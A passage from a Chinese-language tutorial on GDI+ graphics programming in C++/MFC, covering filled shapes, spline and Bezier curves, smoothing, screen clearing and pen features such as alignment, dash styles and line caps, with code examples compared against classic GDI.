<p>而 GDI+的画线方法就没有这个功能，因为在 GDI+是无状态的，没有当前笔和刷的概 念。为了完成与这些 GDI 函数类似的功能，在 GDI+中，你得分两步来做：先用填充方法填 充区域内部，再用画线方法绘制边框。</p>
<p>在 GDI+中画填充图，不需像 GDI 那样得先将刷子选入 DC，而是与 GDI+画线状图的 方法类似，将刷子作为画填充图方法的第一个输入参数。注意，GDI+中的画填充图的方法 都以 Fill 开头。</p>
<p>（1） 画填充矩形[组]FillRectangle[s]</p>
<p>GDI+中有 6 个重载的绘制填充矩形[组]的方法，前 3 个为整数版，后 3 个为对应的浮点 数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status FillRectangle(const Brush* brush, const Rect&#38; rect);&#10;Status FillRectangle(const Brush* brush, INT x, INT y, INT width, INT height); &#10;Status FillRectangles(const Brush* brush, const Rect* rects, INT count);&#10;Status FillRectangle(const Brush* brush, const RectF&#38; rect);&#10;Status FillRectangle(const Brush* brush, REAL x, REAL y, REAL width, REAL height);&#10;Status FillRectangles(const Brush* brush, const RectF* rects, INT count);</span><br></pre></td></tr></table></figure>
<p>用指定刷子 Brush，填充 rect 的内部区域，无边线，填充区域包括矩形的左边界和上边 界，但不包括矩形的右边界和下边界。功能与 GDI 的 FillRect 函数类似：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void FillRect( LPCRECT lpRect, CBrush* pBrush );</span><br></pre></td></tr></table></figure>
<p>但是，GDI 中没有同时填充一个矩形数组的函数。不过 GDI 却有 GDI+中所没有的画填充圆 角矩形的函数 FillSolidRect。</p>
<p>（2） 画填充椭圆 FillEllipse</p>
<p>GDI+中有 4 个重载的绘制填充椭圆的方法，前 2 个为整数版，后 2 个为浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status FillEllipse(const Brush* brush, const Rect&#38; rect);&#10;Status FillEllipse(const Brush* brush, INT x, INT y, INT width, INT height); &#10;Status FillEllipse(const Brush* brush, const RectF&#38; rect);&#10;Status FillEllipse(const Brush* brush, REAL x, REAL y, REAL width, REAL height);</span><br></pre></td></tr></table></figure>
<p>GDI 中没有类似函数，但可以用（采用当前刷填充的）Ellipse 函数来代替。</p>
<p>（3） 画饼图 DrawPie</p>
<p>GDI+中有 4 个重载的绘制饼图的方法，前 2 个为整数版，后 2 个为浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawPie(const Pen* pen, const Rect&#38; rect, REAL startAngle, REAL sweepAngle);&#10;Status DrawPie(const Pen* pen, INT x, INT y, INT width, INT height, REAL startAngle, REAL sweepAngle);&#10;Status DrawPie(const Pen* pen, const RectF&#38; rect, REAL startAngle, REAL sweepAngle);&#10;Status DrawPie(const Pen* pen, REAL x, REAL y, REAL width, REAL height, REAL startAngle, REAL sweepAngle);</span><br></pre></td></tr></table></figure>
<p>与 GDI 的下列函数类似，但是部分输入参数的含义有所不同：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL Pie( int x1, int y1, int x2, int y2, int x3, int y3, int x4, int y4 );&#10;BOOL Pie( LPCRECT lpRect, POINT ptStart, POINT ptEnd );</span><br></pre></td></tr></table></figure>
<p>例如（参见图 14-14）：</p>
<p><img src="../img/gdip-编程基础/Image_023.jpg" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void DrawPies(Graphics &#38;graph, const Color cols[], Point &#38;O, int r, const float data[], int n) &#123;&#10;    Rect rect(O.X - r, O.Y - r, 2 * r, 2 * r);&#10;    float startAngle = 0, sweepAngle; &#10;    for (int i = 0; i &#38;lt; n; i++) &#123;&#10;        sweepAngle = data[i] * 360.0f; &#10;        graph.FillPie(&#38;SolidBrush(cols[i]), rect, startAngle, sweepAngle);&#10;        startAngle += sweepAngle;&#10;    &#125;&#10;&#125;&#10;void CGdipDrawView::OnDraw(CDC* pDC) &#123;&#10;    &#8230;&#8230;&#10;    Graphics graph(pDC-&#38;gt;m_hDC);&#10;    Color cols[] = &#123;Color::Red, Color::Green, Color::Blue, Color::Aqua&#125;;&#10;    float data[] = &#123;0.2f, 0.4f, 0.1f, 0.3f&#125;; &#10;    DrawPies(graph, cols, Point(200, 200), 100, data, 4);&#10;    &#8230;&#8230;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>（4） 画填充多边形 FillPolygon</p>
<p>GDI+中有 4 个重载的绘制填充多边形的方法，前 2 个为整数版，后 2 个为浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status FillPolygonconst Brush* brush, const Point* points, INT count); &#10;Status FillPolygon(const Brush* brush, const Point* points, INT count, FillMode fillMode);&#10;Status FillPolygon(const Brush* brush, const PointF* points, INT count);&#10;Status FillPolygon(const Brush* brush, const PointF* points, INT count, FillMode fillMode);</span><br></pre></td></tr></table></figure>
<p>其中，填充模式参数 FillMode，可取如下两个值之一（参见 8.5.3 中的 1．）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    FillModeAlternate, // &#20132;&#26367;&#27169;&#24335;&#8212;&#8212;&#25353;&#22855;&#20598;&#35268;&#21017;&#22635;&#20805;&#65288;&#40664;&#35748;&#27169;&#24335;&#65289;&#10;    FillModeWinding // &#29615;&#32469;&#27169;&#24335;&#8212;&#8212;&#25353;&#38750;&#38646;&#29615;&#32469;&#35268;&#21017;&#22635;&#20805;&#10;&#125; FillMode;</span><br></pre></td></tr></table></figure>
<p>对简单图形，这两种模式的效果是一样的，但对复杂图形，特别是有穿插的图，结果可 能是不同的。例如（画五角星，参见图 14-15）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// &#23450;&#20041;&#20116;&#35282;&#26143;&#39030;&#28857;&#25968;&#32452;&#10;const int n = 5; &#10;Point p1(100, 0); &#10;Point p2(195, 69); &#10;Point p3(159, 181);&#10;Point p4(41, 181); Point p5(5, 69); &#10;Point ps0[n] = &#123;p1, p2, p3, p4, p5&#125;;&#10;Point ps[n] = &#123;p1, p3, p5, p2, p4&#125;;&#10;// &#21019;&#24314;&#23454;&#24515;&#21047;&#23545;&#35937;&#10;SolidBrush redBrush(Color(128, 0, 0));&#10;SolidBrush greenBrush(Color(0, 128, 0));&#10;SolidBrush blueBrush(Color(0, 0, 128));&#10;// &#30011;&#20116;&#35282;&#26143;&#10;Graphics graph(pDC-&#62;m_hDC); &#10;graph.DrawPolygon(&#38;Pen(Color::Red), ps0, n); &#10;graph.DrawPolygon(&#38;Pen(Color::Green), ps, n);&#10;// &#30011;&#22635;&#20805;&#20116;&#35282;&#26143;&#10;graph.TranslateTransform(200, 0); // &#21491;&#31227; 200 &#20687;&#32032;&#10;graph.FillPolygon(&#38;redBrush, ps0, n); &#10;graph.TranslateTransform(200, 0); &#10;graph.FillPolygon(&#38;greenBrush, ps, n, FillModeAlternate); &#10;graph.TranslateTransform(200, 0); &#10;graph.FillPolygon(&#38;blueBrush, ps, n, FillModeWinding);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_024.jpg" alt="image"></p>
<p>多边形 交替/环绕模式 交替模式 环绕模式 </p>
<p>图 14-15 填充多边形（五角星）</p>
<p>GDI 中也没有与画填充多边形类似的专门函数，但可以用（采用当前刷填充的）Polygon 来代替。</p>
<h3 id="1-6-5_画曲线的方法">1.6.5 画曲线的方法</h3><p>前面讲的各种画线状图或填充图的 GDI+方法，虽然在形式上与 GDI 的有所不同（方法 名前加了 Draw 或 Fill、将笔或刷作为第一个输入参数、部分输的位置入参数改成了大小参 数、并增加了浮点数版），但是在功能上却是相同的。</p>
<p>现在要讲的曲线绘制，则是 GDI+新增加的内容。曲线在机械设计、工程建筑和图形动 画等领域，都有十分广泛应用。</p>
<p>常用的曲线有 Bezier（贝塞尔）曲线和样条（spline）曲线。贝塞尔曲线比较简单，适 合于画控制点少的曲线。当控制点太多时，要不曲线的次数（比点数少 1）太高，要不拼接 比较困难，而且没有局部性（即修改一点影响全局），性能不太好。而样条曲线则可以画任 意多个控制点的曲线，曲线的次数也可以指定（一般为二次或三次），并且具有局部性。贝 塞尔曲线特别是样条曲线有很多变种。常见的贝塞尔曲线有普通贝塞尔曲线和有理贝塞尔曲 线。常用的样条曲线有：B 样条、β 样条、Hermite（厄密）样条、基样条（cardinal splines）、 Kochanek- Bartels 样条和 Catmull-Rom 样条等。</p>
<p>GDI+中所实现的是普通贝塞尔曲线（不过控制点，位于控制多边形的凸包之内）和基 样条曲线（过控制点）。有关曲线和曲面构造方法，会在课程《计算机图形学》中介绍。</p>
<p>（1）基样条曲线（cardinal spline curve）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawCurve(const Pen* pen, const Point* points, INT count, REAL tension = 0.5f); &#10;Status DrawCurve(const Pen* pen, const PointF* points, INT count, REAL tension = 0.5f); &#10;Status DrawClosedCurve(const Pen *pen, const Point* points, INT count, REAL tension = 0.5f);&#10;Status DrawClosedCurve(const Pen *pen, const PointF* points, INT count, REAL tension = 0.5f);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><p>参数 tension（张力）指定曲线的弯曲程度，tension = 0.0（直线）~1.0（最弯曲）。</p>
</li>
<li><p>DrawClosedCurve 方法（连接首尾点）画封闭的基样条曲线。 例如（参见图 14-16）：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void DrawPoints(Graphics &#38;graph, const Color &#38;col, int r, const Point* points, INT count) &#123; &#10;    // &#33258;&#23450;&#20041;&#30340;&#30011;&#28857;&#21015;&#20989;&#25968; SolidBrush brush(col);&#10;    for (int i = 0; i &#60; count; i++) &#10;        graph.FillEllipse(&#38;brush, Rect(points[i].X - r,&#10;            points[i].Y - r, 2 * r, 2 * r));&#10;&#125;&#10;Graphics graph(pDC-&#62;m_hDC);&#10;// &#23450;&#20041; Pen &#23545;&#35937;&#21644; Point &#23545;&#35937;&#30340;&#25968;&#32452;&#10;Pen greenPen(Color::Green, 3);&#10;Point p1(10, 100), p2(100, 50), p3(300, 10), p4(400, 100);&#10;Point ps[4] = &#123;p1, p2, p3, p4&#125;;&#10;// &#32472;&#21046;&#19981;&#21516;&#24352;&#21147;&#30340;&#22522;&#26679;&#26465;&#26354;&#32447;&#10;graph.DrawCurve(&#38;Pen(Color::Magenta), ps, 4, 1.0);&#10;graph.DrawCurve(&#38;greenPen, ps, 4, 0.5);&#10;graph.DrawCurve(&#38;Pen(Color::Blue), ps, 4, 0.0); &#10;DrawPoints(graph, Color::Red, 5, ps, 4); // &#32472;&#21046;&#26354;&#32447;&#30340;&#25511;&#21046;&#28857;&#10;// &#32472;&#21046;&#40664;&#35748;&#24352;&#21147;&#30340;&#22522;&#26679;&#26465;&#12289;&#23553;&#38381;&#22522;&#26679;&#26465;&#19982;&#36125;&#22622;&#23572;&#26354;&#32447;&#10;graph.TranslateTransform(450, 0); // &#27700;&#24179;&#21491;&#31227; 450 &#20010;&#20687;&#32032;&#10;graph.DrawCurve(&#38;greenPen, ps, 4);&#10;graph.DrawClosedCurve(&#38;Pen(Color::Aqua), ps, 4);&#10;graph.DrawBeziers(&#38;Pen(Color::Chocolate), ps, 4); &#10;DrawPoints(graph, Color::Red, 5, ps, 4); // &#32472;&#21046;&#26354;&#32447;&#30340;&#25511;&#21046;&#28857;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_025.jpg" alt="image"></p>
<p>不同张力的基样条曲线 基样条、封闭基样条与贝塞尔曲线 </p>
<p>图 14-16 基样条曲线与贝塞尔曲线</p>
<p>（2）贝塞尔曲线（Bezier curve）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawBezier(const Pen* pen, INT x1, INT y1, INT x2, INT y2, INT x3, INT y3, INT x4, INT y4);&#10;Status DrawBezier(const Pen* pen, const Point&#38; pt1, const Point&#38; pt2, const Point&#38; pt3, const Point&#38; pt4);&#10;Status DrawBeziers(const Pen* pen, const Point* points, INT count);&#10;... // &#23545;&#24212;&#30340;&#28014;&#28857;&#29256;&#26412;</span><br></pre></td></tr></table></figure>
<p>（3）填充封闭基样条曲线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status FillClosedCurve(const Brush* brush, const Point* points, INT count);&#10;Status FillClosedCurve(const Brush* brush, const Point* points, INT count, FillMode fillMode, REAL tension = 0.5f);&#10;&#10;... // &#23545;&#24212;&#30340;&#28014;&#28857;&#29256;&#26412;</span><br></pre></td></tr></table></figure>
<p>例如，将前面画图 14-15 所对应的填充多边形例子中的画填充五角星的三个语句中的 FillPolygon 方法，改为填充封闭基样条曲线方法 FillClosedCurve，结果如图 14-17 所示。</p>
<p><img src="../img/gdip-编程基础/Image_026.jpg" alt="image"></p>
<p>多边形 交替/环绕模式 交替模式 环绕模式 </p>
<p>图 14-17 填充闭曲线</p>
<h3 id="1-6-6_平滑处理">1.6.6 平滑处理</h3><p>可以利用 Graphics 类的设置平滑模式方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetSmoothingMode(SmoothingMode smoothingMode);</span><br></pre></td></tr></table></figure>
<p>来设置绘图时的平滑化处理。其中的输入参数为枚举类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    SmoothingModeInvalid = QualityModeInvalid, //&#26080;&#25928;&#65288;&#20445;&#30041;&#65289;&#10;    SmoothingModeDefault = QualityModeDefault, // &#40664;&#35748;&#65288;&#20302;&#36136;&#65292;&#26080;&#24179;&#28369;&#22788;&#29702;&#65289; &#10;    SmoothingModeHighSpeed = QualityModeLow, // &#39640;&#36895;&#65288;&#20302;&#36136;&#65292;&#26080;&#24179;&#28369;&#22788;&#29702;&#65289; &#10;    SmoothingModeHighQuality = QualityModeHigh, // &#39640;&#36136;&#65288;&#20351;&#29992; 8*4 &#30418;&#36807;&#28388;&#22120;&#65289; &#10;    SmoothingModeNone, // &#26080;&#24179;&#28369;&#22788;&#29702;&#10;    SmoothingModeAntiAlias8x4, // &#20351;&#29992; 8*4 &#30418;&#36807;&#28388;&#22120;&#65288;&#24211;&#20013;&#26080;&#65289; &#10;    SmoothingModeAntiAlias = &#10;    SmoothingModeAntiAlias8x4, // &#20351;&#29992; 8*4 &#30418;&#36807;&#28388;&#22120; &#10;    SmoothingModeAntiAlias8x8 // &#20351;&#29992; 8*8 &#30418;&#36807;&#28388;&#22120;&#65288;&#26368;&#39640;&#36136;&#65292;&#24211;&#20013;&#20063;&#26080;&#65289;&#10;&#125; SmoothingMode;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_027.jpg" alt="image"></p>
<p>图 14-18 平滑处理</p>
<p>例如（参见图 14-18）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;Pen pen(Color::Black, 4);&#10;Rect rect(10, 10, 200, 200);&#10;graph.DrawRectangle(&#38;pen, rect); &#10;graph.RotateTransform(1); &#10;graph.TranslateTransform(20, 20);&#10;//graph.SetSmoothingMode(SmoothingModeNone);&#10;graph.DrawRectangle(&#38;pen, rect); &#10;graph.TranslateTransform(20, 20); &#10;graph.SetSmoothingMode(SmoothingModeAntiAlias); &#10;graph.DrawRectangle(&#38;pen, rect);</span><br></pre></td></tr></table></figure>
<h3 id="1-6-7_清屏方法_Clear">1.6.7 清屏方法 Clear</h3><p>GDI 中没有用于清屏的专门函数，得自己用背景色画窗口大小的填充矩形，或者调用窗 口类的 Invalidate 和 UpdateWindow 函数。现在，GDI+有了清屏方法 Clear：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status Clear(const Color &#38;color);</span><br></pre></td></tr></table></figure>
<p>其中的输入参数 color，为用户指定的填充背景色。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(GetDC()-&#62;m_hDC);&#10;&#8230;&#8230; &#10;graph.Clear(Color::White);</span><br></pre></td></tr></table></figure>
<h2 id="1-7_笔和刷">1.7 笔和刷</h2><p>本节介绍 GDI+的两类绘图工具——笔和刷，它们与 GDI 的相比新增加了许多功能。</p>
<h3 id="1-7-1_笔">1.7.1 笔</h3><p>与 GDI 中的一样，GDI+中的笔（pen）也是画线状图的工具，但是功能更加强大。例 如：透明笔、图案笔、自定义虚线风格、线帽、笔的缩放和旋转、笔的连接点属性等。</p>
<p>GDI+中的笔对应于 Pen 类，被定义在 GdiplusPen.h 头文件中。 笔的构造方法主要有两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pen(const Color &#38;color, REAL width = 1.0); // &#21333;&#33394;&#31508;&#10;Pen(const Brush *brush, REAL width = 1.0); // &#32441;&#29702;&#22270;&#26696;&#31508;</span><br></pre></td></tr></table></figure>
<p>其中，最常用的是第一个，它构造一个颜色为 color，宽度为 width（默认为 1）的单色笔。 如果颜色的α 值&lt;255，则所创建的笔就是带透明度的笔。</p>
<p>（1）笔对齐</p>
<p>当笔宽大于 1 时，默认情况下，是以笔的中心与绘图坐标对齐。但是，也可以采用 Pen类的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetAlignment(PenAlignment penAlignment);</span><br></pre></td></tr></table></figure>
<p>设置为内对齐，其输入参数取枚举类型 PenAlignment 的符号常量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    PenAlignmentCenter = 0, // &#20013;&#24515;&#23545;&#40784;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    PenAlignmentInset = 1 // &#20869;&#23545;&#40784;&#10;&#125; PenAlignment;</span><br></pre></td></tr></table></figure>
<p>例如（输出结果如图 14-19 所示）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;Rect rect(20, 20, 300, 200);&#10;Pen pen(Color::Green, 30), redPen(Color::Red); &#10;graph.DrawEllipse(&#38;pen, rect); &#10;graph.DrawRectangle(&#38;redPen, rect); &#10;pen.SetAlignment(PenAlignmentInset); &#10;graph.TranslateTransform(340, 0); &#10;graph.DrawEllipse(&#38;pen, rect); &#10;graph.DrawRectangle(&#38;redPen, rect);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_028.jpg" alt="image"></p>
<p>a) 中心对齐（默认值） b) 内对齐</p>
<p>图 14-19 笔对齐</p>
<p>（2）图案笔</p>
<p>笔类 Pen 的第二个构造方法，是从刷子来创建笔，如果是单色的实心刷，则相当于第一 个笔构造方法。如果刷子为条纹（影线）或纹理（图像）等图案刷，则该构造函数所创见的 就是对应的图案笔。</p>
<p>例如（条纹笔画椭圆，参见图 14-20）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HatchBrush hBrush(HatchStyleCross, Color::Green, Color::Red); // &#21019;&#24314;&#21313;&#23383;&#32447;&#26465;&#32441;&#21047; &#10;Pen hPen(&#38;**hBrush**, 40); // &#21019;&#24314;&#23485;&#24230;&#20026; 40 &#20687;&#32032;&#30340;&#26465;&#32441;&#31508; &#10;graph.DrawEllipse(&#38;hPen, 20, 20, 400, 250); // &#30011;&#26925;&#22278;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_029.jpg" alt="image"></p>
<p>图 14-20 条纹笔椭圆</p>
<p><img src="../img/gdip-编程基础/Image_030.jpg" alt="image"></p>
<p>图 14-21 纹理笔椭圆 </p>
<p>又例如（纹理笔画椭圆，参见图 14-21）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Image img(L&#34;&#24352;&#19996;&#20581;.bmp&#34;); // &#21019;&#24314;&#22270;&#20687;&#23545;&#35937;&#65292;&#24182;&#35013;&#20837;&#22270;&#20687;&#25991;&#20214;&#10;TextureBrush tBrush(&#38;img); // &#21019;&#24314;&#32441;&#29702;&#21047;&#10;Pen tPen(&#38;**tBrush**, 80); // &#21019;&#24314;&#23485;&#24230;&#20026; 80 &#20687;&#32032;&#30340;&#32441;&#29702;&#31508; &#10;Graphics graph(GetDC()-&#38;gt;m_hDC); // &#21019;&#24314;&#22270;&#24418;&#23545;&#35937; &#10;graph.DrawEllipse(&#38;tPen, 40, 40, 640, 400); // &#30011;&#26925;&#22278;</span><br></pre></td></tr></table></figure>
<p>（3）线型</p>
<p>与 GDI 一样，对 GDI+中的笔，也可以设置线型。所用的方法为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetDashStyle(DashStyle dashStyle);</span><br></pre></td></tr></table></figure>
<p>其中的输入参数，为虚线风格枚举 DashStyle：（GdiplusEnums.h） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum DashStyle &#123;&#10;    DashStyleSolid, // 0 &#23454;&#32447; &#65288;&#40664;&#35748;&#20540;&#65289;&#10;    DashStyleDash, // 1 &#34394;&#32447;&#10;    DashStyleDot, // 2 &#28857;&#32447;&#65306;&#10;    DashStyleDashDot, // 3 &#34394;&#28857;&#32447;&#65306;&#10;    DashStyleDashDotDot, // 4 &#34394;&#28857;&#28857;&#32447; &#10;    DashStyleCustom // 5 &#33258;&#23450;&#20041;&#34394;&#32447;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/1-7-1-2.png" alt=""></p>
<p>可以用 Pen 类的另一个方法来获取笔的线型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DashStyle GetDashStyle() const;</span><br></pre></td></tr></table></figure>
<p>GDI+中的线型，大多数与 GDI 中的相同，区别主要有两点：</p>
<ul>
<li><p>GDI 中的非实线线型，对宽度&gt;1 的笔无效；而 GDI+的笔对任意非零宽度的笔都是有效的。</p>
</li>
<li><p>GDI+中新增了一种风格——自定义虚线风格。 具体的自定义虚线风格，由 Pen 类的设置虚线图案的方法</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetDashPattern(const REAL *dashArray, INT count);</span><br></pre></td></tr></table></figure>
<p>来设置，其中的实数数组 dashArray 含若干个正实数（单位为像素），按线、空、线、空、„„ 的交叉方式排列；参数 count 为数组中实数的个数（须&gt;0）。</p>
<p>例如（参见图 14-22）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#62;m_hDC);&#10;Pen pen(Color::Black, 8); // &#21019;&#24314;&#23485; 8 &#20010;&#20687;&#32032;&#30340;&#40657;&#33394;&#31508;&#65288;&#30011;&#34394;&#32447;&#29992;&#65289;&#10;// &#32447; 5&#12289;&#31354; 2&#12289;&#32447; 15&#12289;&#31354; 4&#65288;&#20687;&#32032;&#65289;&#10;REAL dashVals[4] = &#123;5.0f, 2.0f, 15.0f, 4.0f&#125;;&#10;FontFamily fontFamily(L&#34;Times New Roman&#34;); // &#21019;&#24314;&#23383;&#20307;&#26063;&#23545;&#35937;&#10;// &#21019;&#24314; 5 &#21495;&#23383;&#22823;&#23567;&#30340; Times New Roman &#23383;&#20307;&#10;Font font(&#38;fontFamily, 10.5);&#10;// &#21019;&#24314;&#32511;&#33394;&#30340;&#23454;&#24515;&#21047;&#65288;&#20889;&#23383;&#31526;&#20018;&#29992;&#65289;&#10;SolidBrush brush(Color(0, 128, 0));&#10;// &#31508;&#30340;&#34394;&#32447;&#39118;&#26684;&#26522;&#20030;&#24120;&#37327;&#30340;&#21517;&#31216;&#23383;&#31526;&#20018;&#25968;&#32452;&#10;CString strs[] = &#123;L&#34;DashStyleSolid&#34;, L&#34;DashStyleDash&#34;, L&#34;DashStyleDot&#34;, L&#34;DashStyleDashDot&#34;, L&#34;DashStyleDashDotDot&#34;, L&#34;DashStyleCustom&#34;&#125;;&#10;for (int i = 0; i &#38;lt;= 5; i++) &#123; // &#32472;&#21046;&#21508;&#31181;&#39118;&#26684;&#30340;&#34394;&#32447;&#21450;&#20854;&#21517;&#31216;&#20018;&#10;    pen.**SetDashStyle**((DashStyle)i); // &#35774;&#32622;&#31508;&#30340;&#34394;&#32447;&#39118;&#26684;&#10;    // &#35774;&#32622;&#33258;&#23450;&#20041;&#34394;&#32447;&#22270;&#26696;&#10;    if (i == 5) pen.SetDashPattern(dashVals, 4);&#10;    // &#30011;&#34394;&#32447;&#10;    graph.DrawLine(&#38;pen, 10, 10 + i * 20, 400, 10 + i * 20);&#10;    // &#32472;&#21046;&#34394;&#32447;&#39118;&#26684;&#26522;&#20030;&#24120;&#37327;&#21517;&#31216;&#23383;&#31526;&#20018;&#10;    graph.DrawString(strs[i], -1, &#38;font,&#10;        PointF(410, 2 + i * 20), &#38;brush);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_037.jpg" alt="image"></p>
<p>图 14-22 虚线风格</p>
<p>还可以用 Pen 类的另一个方法来获取笔的自定义虚线图案数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INT GetDashPatternCount(VOID); // &#33719;&#21462;&#34394;&#32447;&#25968;&#32452;&#20013;&#23454;&#25968;&#30340;&#20010;&#25968;&#10;Status GetDashPattern(REAL *dashArray, INT count); // &#33719;&#21462;&#34394;&#32447;&#25968;&#32452;</span><br></pre></td></tr></table></figure>
<p>（4）线帽</p>
<p>线帽（line cap）是指线条两端的外观，默认为正方形，也可以用 Pen 类的下列方法来 设置不同的线端形状：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status SetStartCap(LineCap startCap); // &#35774;&#32622;&#36215;&#28857;&#30340;&#32447;&#24125;&#10;Status SetEndCap(LineCap endCap); // &#35774;&#32622;&#32456;&#28857;&#30340;&#32447;&#24125;&#10;// &#35774;&#32622;&#36215;&#28857;&#12289;&#32456;&#28857;&#21644;&#34394;&#32447;&#30340;&#32447;&#24125;&#10;Status SetLineCap(LineCap startCap, LineCap endCap, DashCap dashCap);</span><br></pre></td></tr></table></figure>
<p>其中的线帽枚举 LineCap 为（GdiplusEnums.h）： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    LineCapFlat = 0, // &#24179;&#32447;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#24179;&#32447;&#30340;&#20013;&#28857;&#65288;&#40664;&#35748;&#20540;&#65289;&#10;    LineCapSquare = 1, // &#26041;&#24418;&#65292;&#39640;&#24230;=&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#27491;&#26041;&#24418;&#20013;&#24515; &#10;    LineCapRound = 2, // &#22278;&#24418;&#65292;&#30452;&#24452;=&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#22278;&#24515; &#10;    LineCapTriangle = 3, // &#19977;&#35282;&#65292;&#39640;&#24230;=&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#20854;&#24213;&#36793;&#20013;&#28857; &#10;    LineCapNoAnchor = 0x10, // &#26080;&#38170;&#65292;&#21516;&#24179;&#32447;&#10;    LineCapSquareAnchor = 0x11, // &#26041;&#24418;&#38170;&#65292;&#39640;&#24230;&#38;gt;&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#27491;&#26041;&#24418;&#20013;&#24515; LineCapRoundAnchor = 0x12, // &#22278;&#24418;&#38170;&#65292;&#30452;&#24452;&#38;gt;&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#22278;&#24515; LineCapDiamondAnchor = 0x13, // &#33777;&#24418;&#38170;&#65292;&#39640;&#24230;&#38;gt;&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#33777;&#24418;&#20013;&#24515; LineCapArrowAnchor = 0x14, // &#31661;&#22836;&#38170;&#65292;&#39640;&#24230;&#38;gt;&#32447;&#23485;&#65292;&#30452;&#32447;&#36215;&#28857;&#20301;&#20110;&#31661;&#22836;&#30340;&#23574;&#28857; LineCapCustom = 0xff // 